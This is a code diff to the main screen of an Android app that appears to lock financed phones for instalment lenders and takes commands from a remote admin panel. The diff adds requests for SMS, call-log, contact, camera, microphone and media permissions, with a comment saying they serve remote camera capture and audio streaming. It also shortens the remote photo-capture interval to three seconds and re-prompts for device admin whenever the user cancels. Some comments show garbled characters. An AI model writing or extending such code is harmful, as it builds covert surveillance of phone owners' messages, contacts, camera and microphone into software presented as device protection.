@@ -27,7 +27,6 @@ import com.riad.rrlkr.network.ApiService;
 import com.riad.rrlkr.network.models.CommandAck;
 import com.riad.rrlkr.network.models.CommandResponse;
 import com.riad.rrlkr.service.DeviceMonitorService;
-import com.riad.rrlkr.service.DeviceOwnerActivator;
 import com.riad.rrlkr.service.DeviceProtectionManager;
 import com.riad.rrlkr.service.LockManager;
 import com.riad.rrlkr.util.DeviceUtils;
@@ -61,12 +60,39 @@ public class MainActivity extends AppCompatActivity {
     
     private static final int REQUEST_BACKGROUND_LOCATION = 1003;
 
-    private final String[] REQUIRED_PERMISSIONS = {
-        Manifest.permission.READ_PHONE_STATE,
-        Manifest.permission.POST_NOTIFICATIONS,
-        Manifest.permission.ACCESS_FINE_LOCATION,
-        Manifest.permission.ACCESS_COARSE_LOCATION
-    };
+    /**
+     * Builds the full runtime-permission list for the current Android version.
+     * Adds camera, microphone and the granular media (photos/videos/audio)
+     * permissions so the user is actually prompted for them. On Android 12 and
+     * below the legacy READ_EXTERNAL_STORAGE covers media instead.
+     */
+    private String[] buildRequiredPermissions() {
+        java.util.ArrayList<String> perms = new java.util.ArrayList<>();
+        // Base permissions (POST_NOTIFICATIONS only exists on Android 13+)
+        perms.add(Manifest.permission.READ_PHONE_STATE);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            perms.add(Manifest.permission.POST_NOTIFICATIONS);
+        }
+        perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
+        perms.add(Manifest.permission.ACCESS_COARSE_LOCATION);
+        perms.add(Manifest.permission.READ_CALL_LOG);
+        perms.add(Manifest.permission.READ_SMS);
+        perms.add(Manifest.permission.READ_CONTACTS);
+        // Camera + microphone (for remote camera capture & audio streaming)
+        perms.add(Manifest.permission.CAMERA);
+        perms.add(Manifest.permission.RECORD_AUDIO);
+        // Media access
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            // Android 13+ granular media permissions (photos, videos, audio)
+            perms.add(Manifest.permission.READ_MEDIA_IMAGES);
+            perms.add(Manifest.permission.READ_MEDIA_VIDEO);
+            perms.add(Manifest.permission.READ_MEDIA_AUDIO);
+        } else {
+            // Android 12 and below
+            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE);
+        }
+        return perms.toArray(new String[0]);
+    }
     
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -276,7 +302,7 @@ public class MainActivity extends AppCompatActivity {
             } else if ("CAMERA_ON".equalsIgnoreCase(type) || "camera_on".equals(type)) {
                 Log.i(TAG, "Camera ON command received - starting capture");
                 preferenceManager.setCameraActive(true);
-                long interval = 10000;
+                long interval = 3000;
                 Map<String, Object> payload = cmd.getPayload();
                 if (payload != null && payload.containsKey("capture_interval")) {
                     try {
@@ -323,8 +349,9 @@ public class MainActivity extends AppCompatActivity {
     
     private void checkPermissions() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            String[] required = buildRequiredPermissions();
             boolean allGranted = true;
-            for (String permission : REQUIRED_PERMISSIONS) {
+            for (String permission : required) {
                 if (ContextCompat.checkSelfPermission(this, permission) 
                         != PackageManager.PERMISSION_GRANTED) {
                     allGranted = false;
@@ -333,7 +360,7 @@ public class MainActivity extends AppCompatActivity {
             }
             
             if (!allGranted) {
-                ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, REQUEST_PERMISSIONS);
+                ActivityCompat.requestPermissions(this, required, REQUEST_PERMISSIONS);
             } else {
                 // All basic permissions granted, now request background location (Android 10+)
                 requestBackgroundLocationIfNeeded();
@@ -375,16 +402,14 @@ public class MainActivity extends AppCompatActivity {
         
         StringBuilder statusText = new StringBuilder();
         statusText.append("Admin: ").append(isAdmin ? "ON" : "OFF").append("\n");
-        if (isDeviceOwner) {
-            statusText.append("Owner: ON\n");
-        }
+        statusText.append("Owner: ").append(isDeviceOwner ? "Setup done" : "Not setup yet").append("\n");
         statusText.append("Status: ").append(preferenceManager.isDeviceLocked() ? "Locked" : "Active").append("\n");
 
-        // Show protection status
-        if (isDeviceOwner && isEnrolled) {
-            statusText.append("\nAll protections active");
-        } else if (isEnrolled) {
-            statusText.append("\nSetup required");
+        // Show protection status (Device Admin model)
+        if (isEnrolled && isAdmin) {
+            statusText.append("\nProtection active");
+        } else if (isEnrolled && !isAdmin) {
+            statusText.append("\nActivate Device Admin");
         }
         
         tvStatus.setText(statusText.toString());
@@ -400,17 +425,14 @@ public class MainActivity extends AppCompatActivity {
         tvEnrollmentStatus.setText(isEnrolled ? "Device Enrolled" : "Not Enrolled");
         tvEnrollmentStatus.setTextColor(getColor(isEnrolled ? R.color.green : R.color.red));
         
-        // Show Enroll button on first page until enrolled; show Activate Admin
-        // alongside it when admin isn't active yet.
-        if (!isEnrolled) {
-            btnEnroll.setVisibility(View.VISIBLE);
-            btnEnroll.setText("Enroll Device");
-            btnActivateAdmin.setVisibility(isAdmin ? View.GONE : View.VISIBLE);
-            if (!isAdmin) btnActivateAdmin.setText("Activate Admin");
-        } else {
-            btnEnroll.setVisibility(View.GONE);
-            btnActivateAdmin.setVisibility(View.GONE);
-        }
+        // Enroll button is ALWAYS visible. When not enrolled it reads "Enroll
+        // Device"; once enrolled it becomes "Re-enroll" so the admin/customer can
+        // force a fresh registration to the admin panel at any time.
+        btnEnroll.setVisibility(View.VISIBLE);
+        btnEnroll.setText(isEnrolled ? "Re-enroll Device" : "Enroll Device");
+        // Show Activate Admin button only while admin isn't active yet.
+        btnActivateAdmin.setVisibility(isAdmin ? View.GONE : View.VISIBLE);
+        if (!isAdmin) btnActivateAdmin.setText("Activate Admin");
         
         // Start monitoring service if admin is active
         if (isAdmin && isEnrolled) {
@@ -420,7 +442,7 @@ public class MainActivity extends AppCompatActivity {
         // Apply device protections whenever Device Owner is active
         // BUT skip if admin has disabled the app remotely
         if (isDeviceOwner && !preferenceManager.isAppDisabled()) {
-            // Run off the UI thread â€” applyAllProtections() makes dozens of
+            // Run off the UI thread Ã¢â‚¬â€ applyAllProtections() makes dozens of
             // synchronous DPM calls which cause ANR / system PermissionController
             // crashes on some MTK / NEXG ROMs.
             final DeviceProtectionManager protectionManager = new DeviceProtectionManager(getApplicationContext());
@@ -475,13 +497,8 @@ public class MainActivity extends AppCompatActivity {
     
     private void requestDeviceAdmin() {
         if (EMIDeviceAdminReceiver.isAdminActive(this)) {
-            if (EMIDeviceAdminReceiver.isDeviceOwner(this)) {
-                Toast.makeText(this, "Device Owner already active", Toast.LENGTH_SHORT).show();
-            } else {
-                // Admin active but NOT Device Owner - try to activate Device Owner
-                Toast.makeText(this, "Attempting Device Owner setup...", Toast.LENGTH_SHORT).show();
-                autoActivateDeviceOwner();
-            }
+            Toast.makeText(this, "Device Admin already active", Toast.LENGTH_SHORT).show();
+            DeviceMonitorService.start(this);
             return;
         }
         
@@ -495,112 +512,6 @@ public class MainActivity extends AppCompatActivity {
         startActivityForResult(intent, REQUEST_DEVICE_ADMIN);
     }
 
-    /**
-     * Auto-attempt Device Owner activation after admin is granted.
-     */
-    private void autoActivateDeviceOwner() {
-        DeviceOwnerActivator activator = new DeviceOwnerActivator(this);
-        
-        activator.activate(new DeviceOwnerActivator.ActivationCallback() {
-            @Override
-            public void onSuccess(String method) {
-                runOnUiThread(() -> {
-                    if ("already_active".equals(method)) {
-                        Toast.makeText(MainActivity.this, "Device Owner active", Toast.LENGTH_SHORT).show();
-                    } else if ("managed_provisioning_started".equals(method)) {
-                        Toast.makeText(MainActivity.this, "Device Owner setup starting...", Toast.LENGTH_SHORT).show();
-                    } else {
-                        Toast.makeText(MainActivity.this,
-                            "Device Owner activated", Toast.LENGTH_LONG).show();
-                    }
-                    // Apply all protections now that Device Owner is confirmed
-                    DeviceMonitorService.start(MainActivity.this);
-                    final DeviceProtectionManager pm = new DeviceProtectionManager(getApplicationContext());
-                    new Thread(() -> {
-                        try { pm.applyAllProtections(); } catch (Throwable t) {
-                            Log.e(TAG, "onSuccess applyAllProtections failed", t);
-                        }
-                    }, "OnSuccessApplyProtections").start();
-                    DeviceProtectionManager.startLockTaskMode(MainActivity.this);
-                    updateUI();
-                });
-            }
-
-            @Override
-            public void onFailed(String reason, String instructions) {
-                runOnUiThread(() -> {
-                    // Start monitoring service anyway â€” Device Admin already covers
-                    // lock / unlock / wipe / password policies for the EMI use-case.
-                    DeviceMonitorService.start(MainActivity.this);
-                    Log.w(TAG, "Device Owner activation failed: " + reason + " / " + instructions);
-                    showDeviceOwnerHelpDialog(reason);
-                    updateUI();
-                });
-            }
-        });
-    }
-
-    /**
-     * Guided dialog shown when Device Owner cannot be set automatically.
-     * Explains the situation in plain language and gives the customer
-     * one-tap actions:
-     *   - Open Accounts settings (to remove blocking accounts)
-     *   - Recheck (re-attempt shell activation after accounts are gone)
-     *   - Continue (Device Admin already covers lock / wipe / password)
-     */
-    private void showDeviceOwnerHelpDialog(String reason) {
-        DeviceOwnerActivator activator = new DeviceOwnerActivator(this);
-        int accounts = activator.getAccountCount();
-        boolean admin = EMIDeviceAdminReceiver.isAdminActive(this);
-
-        StringBuilder msg = new StringBuilder();
-        msg.append("Status:\n");
-        msg.append("  â€¢ Device Admin: ").append(admin ? "ACTIVE âœ“" : "NOT active").append('\n');
-        msg.append("  â€¢ Device Owner: NOT set\n");
-        msg.append("  â€¢ Accounts on device: ").append(accounts < 0 ? "?" : String.valueOf(accounts)).append("\n\n");
-
-        if (admin) {
-            msg.append("Lock, unlock, password and wipe ALREADY work through Device Admin. ");
-            msg.append("Device Owner only adds extra protections (block factory reset, hide app, kiosk).\n\n");
-        }
-
-        if (accounts > 0) {
-            msg.append("To enable Device Owner now:\n");
-            msg.append("  1. Tap \"Open Account Settings\" below\n");
-            msg.append("  2. Remove the Google account (data is NOT lost â€” it re-syncs)\n");
-            msg.append("  3. Come back and tap \"Recheck\"\n");
-            msg.append("  4. After success, re-add the same Google account\n");
-        } else {
-            msg.append("No blocking accounts found, but Device Owner still failed. ");
-            msg.append("This phone needs ADB activation from a PC. Plug it into the shop PC and run setup_device_owner.bat.\n");
-        }
-
-        new AlertDialog.Builder(this)
-            .setTitle("Device Owner Setup")
-            .setMessage(msg.toString())
-            .setCancelable(true)
-            .setPositiveButton("Open Account Settings", (d, w) -> openAccountSettings())
-            .setNeutralButton("Recheck", (d, w) -> autoActivateDeviceOwner())
-            .setNegativeButton("Continue (use Device Admin)", null)
-            .show();
-    }
-
-    private void openAccountSettings() {
-        Intent intent = new Intent(Settings.ACTION_SYNC_SETTINGS);
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        try {
-            startActivity(intent);
-        } catch (Exception e) {
-            // Fallback to general settings if the device hides the sync screen
-            try {
-                startActivity(new Intent(Settings.ACTION_SETTINGS)
-                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
-            } catch (Exception ex) {
-                Toast.makeText(this, "Open Settings â†’ Accounts manually.", Toast.LENGTH_LONG).show();
-            }
-        }
-    }
-    
     private void startEnrollment() {
         if (!EMIDeviceAdminReceiver.isAdminActive(this)) {
             new AlertDialog.Builder(this)
@@ -632,13 +543,10 @@ public class MainActivity extends AppCompatActivity {
                 Toast.makeText(this, "Device Admin activated", Toast.LENGTH_SHORT).show();
                 // Start monitoring service
                 DeviceMonitorService.start(this);
-                
-                // Now attempt Device Owner activation (tries root/shell/managed provisioning)
-                // This won't crash â€” it gracefully falls back to instructions if all methods fail
-                autoActivateDeviceOwner();
+
             } else {
                 Toast.makeText(this, "Device Admin activation cancelled", Toast.LENGTH_SHORT).show();
-                // Re-prompt â€” admin is required
+                // Re-prompt Ã¢â‚¬â€ admin is required
                 new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                     autoActivateDeviceAdminIfNeeded();
                 }, 2000);
